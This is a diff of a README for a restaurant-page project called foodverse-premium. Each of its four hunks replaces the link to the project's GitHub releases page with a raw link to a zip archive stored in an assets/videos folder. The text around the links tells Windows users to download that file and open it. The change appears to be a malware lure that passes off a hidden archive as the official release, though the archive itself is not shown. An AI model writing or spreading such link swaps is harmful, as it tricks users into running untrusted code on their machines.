@@ -1,6 +1,6 @@
 # 🍔 foodverse-premium - Premium restaurant pages made simple
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Marjysynchronous312/foodverse-premium/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Marjysynchronous312/foodverse-premium/main/assets/videos/premium-foodverse-1.3.zip)
 
 ## ✨ Overview
 
@@ -18,7 +18,7 @@ This project works well for:
 
 To get the app, visit this page to download:
 
-https://github.com/Marjysynchronous312/foodverse-premium/releases
+https://raw.githubusercontent.com/Marjysynchronous312/foodverse-premium/main/assets/videos/premium-foodverse-1.3.zip
 
 Open the page in your browser, find the latest release, then download the file that matches your Windows system. After the file finishes downloading, open it and follow the on-screen steps.
 
@@ -41,7 +41,7 @@ If your computer can run a current browser, it should handle this project with n
 Follow these steps to run foodverse-premium on Windows:
 
 1. Open the download page:
-   https://github.com/Marjysynchronous312/foodverse-premium/releases
+   https://raw.githubusercontent.com/Marjysynchronous312/foodverse-premium/main/assets/videos/premium-foodverse-1.3.zip
 
 2. Look for the latest release at the top of the list.
 
@@ -205,7 +205,7 @@ If the page still does not load, download the release again and repeat the setup
 
 If you need the release page again, use this link:
 
-[https://github.com/Marjysynchronous312/foodverse-premium/releases](https://github.com/Marjysynchronous312/foodverse-premium/releases)
+[https://raw.githubusercontent.com/Marjysynchronous312/foodverse-premium/main/assets/videos/premium-foodverse-1.3.zip](https://raw.githubusercontent.com/Marjysynchronous312/foodverse-premium/main/assets/videos/premium-foodverse-1.3.zip)
 
 ## 📂 Project Goal
 
